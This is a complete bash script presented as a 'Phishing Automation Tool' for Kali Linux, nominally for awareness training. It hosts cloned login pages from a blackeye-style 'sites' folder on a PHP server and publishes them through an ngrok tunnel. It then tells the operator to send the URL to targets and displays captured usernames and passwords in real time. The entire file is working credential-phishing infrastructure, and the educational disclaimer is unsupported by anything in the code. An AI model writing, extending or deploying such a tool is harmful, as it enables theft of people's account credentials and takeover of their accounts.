#!/bin/bash

#######################################################
# Phishing Automation Tool - Educational Purpose Only
# Compatible with Kali Linux
# Author: Created for employee phishing awareness training
#######################################################

# Colors for better output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Global variables
PHP_PID=""
NGROK_PID=""
NGROK_URL=""
SELECTED_SITE=""
PHP_PORT=8080

# Banner
show_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║                                                           ║"
    echo "║        ${BOLD}PHISHING AUTOMATION TOOL${NC}${CYAN}                          ║"
    echo "║        ${YELLOW}For Educational Purpose Only${NC}${CYAN}                     ║"
    echo "║                                                           ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Check dependencies
check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    
    # Check PHP
    if ! command -v php &> /dev/null; then
        echo -e "${RED}[!] PHP is not installed. Please install PHP first.${NC}"
        echo -e "${YELLOW}    Run: sudo apt-get install php${NC}"
        exit 1
    fi
    
    # Check ngrok
    if ! command -v ngrok &> /dev/null; then
        echo -e "${RED}[!] ngrok is not installed.${NC}"
        echo -e "${YELLOW}[*] Please install ngrok:${NC}"
        echo -e "${YELLOW}    1. Download from: https://ngrok.com/download${NC}"
        echo -e "${YELLOW}    2. Extract and move to /usr/local/bin/${NC}"
        echo -e "${YELLOW}    3. Run: ngrok authtoken YOUR_TOKEN${NC}"
        exit 1
    fi
    
    # Check curl
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}[!] curl is not installed. Please install curl first.${NC}"
        echo -e "${YELLOW}    Run: sudo apt-get install curl${NC}"
        exit 1
    fi
    
    # Check jq
    if ! command -v jq &> /dev/null; then
        echo -e "${RED}[!] jq is not installed. Please install jq first.${NC}"
        echo -e "${YELLOW}    Run: sudo apt-get install jq${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[✓] All dependencies are installed${NC}"
    echo ""
}

# List available phishing sites
list_sites() {
    echo -e "${CYAN}${BOLD}Available Phishing Sites:${NC}"
    echo ""
    
    local sites_dir="sites"
    local counter=1
    
    # Store sites in array
    SITES=()
    
    for site in "$sites_dir"/*; do
        if [ -d "$site" ]; then
            site_name=$(basename "$site")
            SITES+=("$site_name")
            echo -e "${YELLOW}[$counter]${NC} $(echo $site_name | sed 's/.*/\u&/')"
            ((counter++))
        fi
    done
    
    echo ""
}

# Select site
select_site() {
    while true; do
        echo -e "${CYAN}Enter the number of the site you want to use: ${NC}"
        read -p "> " choice
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#SITES[@]}" ]; then
            SELECTED_SITE="${SITES[$((choice-1))]}"
            echo -e "${GREEN}[✓] Selected: $SELECTED_SITE${NC}"
            break
        else
            echo -e "${RED}[!] Invalid choice. Please try again.${NC}"
        fi
    done
    echo ""
}

# Start PHP server
start_php_server() {
    echo -e "${BLUE}[*] Starting PHP server on port $PHP_PORT...${NC}"
    
    cd "sites/$SELECTED_SITE" || exit
    
    # Clean up old credentials file
    if [ -f "usernames.txt" ]; then
        > usernames.txt
        echo -e "${YELLOW}[!] Cleared previous credentials${NC}"
    fi
    
    # Create index router if it doesn't exist
    if [ ! -f "index.php" ]; then
        echo -e "${YELLOW}[*] Creating index router...${NC}"
        cat > index.php << 'ROUTER_EOF'
<?php
// Auto-generated router for phishing tool
// Serves the appropriate login page

// Determine which file to serve
if (file_exists('login.html')) {
    include 'login.html';
} elseif (file_exists('index.html')) {
    include 'index.html';
} elseif (file_exists('form.html')) {
    include 'form.html';
} elseif (file_exists('mobile.html')) {
    include 'mobile.html';
} else {
    // List all HTML files and serve the first one
    $html_files = glob('*.html');
    if (!empty($html_files)) {
        include $html_files[0];
    } else {
        echo '<h1>Phishing page not found</h1>';
        echo '<p>No HTML files found in this directory.</p>';
    }
}
?>
ROUTER_EOF
    fi
    
    # Start PHP server with router
    php -S 0.0.0.0:$PHP_PORT > /dev/null 2>&1 &
    PHP_PID=$!
    
    # Wait a bit for server to start
    sleep 2
    
    # Check if server is running
    if kill -0 $PHP_PID 2>/dev/null; then
        echo -e "${GREEN}[✓] PHP server started (PID: $PHP_PID)${NC}"
        return 0
    else
        echo -e "${RED}[!] Failed to start PHP server${NC}"
        return 1
    fi
}

# Start ngrok tunnel
start_ngrok_tunnel() {
    echo -e "${BLUE}[*] Starting ngrok tunnel...${NC}"
    
    # Start ngrok
    ngrok http $PHP_PORT > /dev/null 2>&1 &
    NGROK_PID=$!
    
    # Wait for ngrok to initialize
    echo -e "${YELLOW}[*] Waiting for ngrok to initialize...${NC}"
    sleep 5
    
    # Get ngrok URL using API
    local max_attempts=10
    local attempt=1
    
    while [ $attempt -le $max_attempts ]; do
        NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' 2>/dev/null)
        
        if [ ! -z "$NGROK_URL" ] && [ "$NGROK_URL" != "null" ]; then
            echo -e "${GREEN}[✓] ngrok tunnel created${NC}"
            echo ""
            echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
            echo -e "${CYAN}║${NC}  ${BOLD}${GREEN}Phishing URL:${NC}                                          ${CYAN}║${NC}"
            echo -e "${CYAN}║${NC}  ${YELLOW}$NGROK_URL${NC}"
            echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
            echo ""
            echo -e "${BLUE}[*] TIP: If you get redirect errors, make sure to access:${NC}"
            echo -e "${BLUE}    $NGROK_URL (main page will load automatically)${NC}"
            echo ""
            return 0
        fi
        
        echo -e "${YELLOW}[*] Attempt $attempt/$max_attempts - Waiting for ngrok...${NC}"
        sleep 2
        ((attempt++))
    done
    
    echo -e "${RED}[!] Failed to get ngrok URL${NC}"
    return 1
}

# Monitor credentials
monitor_credentials() {
    echo -e "${BLUE}[*] Monitoring for captured credentials...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    
    local credentials_file="usernames.txt"
    local last_size=0
    
    # Touch the file if it doesn't exist
    touch "$credentials_file"
    
    while true; do
        if [ -f "$credentials_file" ]; then
            current_size=$(wc -l < "$credentials_file" 2>/dev/null || echo "0")
            
            if [ "$current_size" -gt "$last_size" ]; then
                # New credentials captured
                echo -e "${GREEN}${BOLD}[!] NEW CREDENTIALS CAPTURED!${NC}"
                echo -e "${CYAN}────────────────────────────────────────────────────────────${NC}"
                
                # Show only new lines
                tail -n $((current_size - last_size)) "$credentials_file" | while read -r line; do
                    echo -e "${YELLOW}$line${NC}"
                done
                
                echo -e "${CYAN}────────────────────────────────────────────────────────────${NC}"
                echo -e "${GREEN}Total captures: $current_size${NC}"
                echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
                
                last_size=$current_size
            fi
        fi
        
        sleep 1
    done
}

# Cleanup function
cleanup() {
    echo ""
    echo -e "${BLUE}[*] Cleaning up...${NC}"
    
    # Kill PHP server
    if [ ! -z "$PHP_PID" ] && kill -0 $PHP_PID 2>/dev/null; then
        kill $PHP_PID 2>/dev/null
        echo -e "${GREEN}[✓] PHP server stopped${NC}"
    fi
    
    # Kill ngrok
    if [ ! -z "$NGROK_PID" ] && kill -0 $NGROK_PID 2>/dev/null; then
        kill $NGROK_PID 2>/dev/null
        echo -e "${GREEN}[✓] ngrok tunnel closed${NC}"
    fi
    
    # Show captured credentials summary
    if [ -f "sites/$SELECTED_SITE/usernames.txt" ]; then
        local total=$(wc -l < "sites/$SELECTED_SITE/usernames.txt")
        if [ "$total" -gt 0 ]; then
            echo ""
            echo -e "${CYAN}══════════════════ CAPTURE SUMMARY ═══════════════════${NC}"
            echo -e "${GREEN}Total credentials captured: $total${NC}"
            echo -e "${YELLOW}Saved in: sites/$SELECTED_SITE/usernames.txt${NC}"
            echo -e "${CYAN}═══════════════════════════════════════════════════════${NC}"
        fi
    fi
    
    echo ""
    echo -e "${GREEN}[✓] Cleanup complete${NC}"
    echo -e "${CYAN}Thank you for using Phishing Automation Tool${NC}"
    echo ""
    
    exit 0
}

# Trap Ctrl+C
trap cleanup SIGINT SIGTERM

# Main function
main() {
    show_banner
    
    # Check if we're in the correct directory
    if [ ! -d "sites" ]; then
        echo -e "${RED}[!] Error: 'sites' directory not found${NC}"
        echo -e "${YELLOW}[*] Please run this script from the blackeye-im-master directory${NC}"
        exit 1
    fi
    
    check_dependencies
    list_sites
    select_site
    
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Start services
    if ! start_php_server; then
        echo -e "${RED}[!] Failed to start PHP server. Exiting...${NC}"
        exit 1
    fi
    
    if ! start_ngrok_tunnel; then
        echo -e "${RED}[!] Failed to start ngrok tunnel. Cleaning up...${NC}"
        cleanup
    fi
    
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${GREEN}${BOLD}[✓] All systems ready!${NC}"
    echo -e "${YELLOW}[*] Send the ngrok URL to your targets${NC}"
    echo -e "${YELLOW}[*] Credentials will appear below in real-time${NC}"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Start monitoring
    monitor_credentials
}

# Run main
main
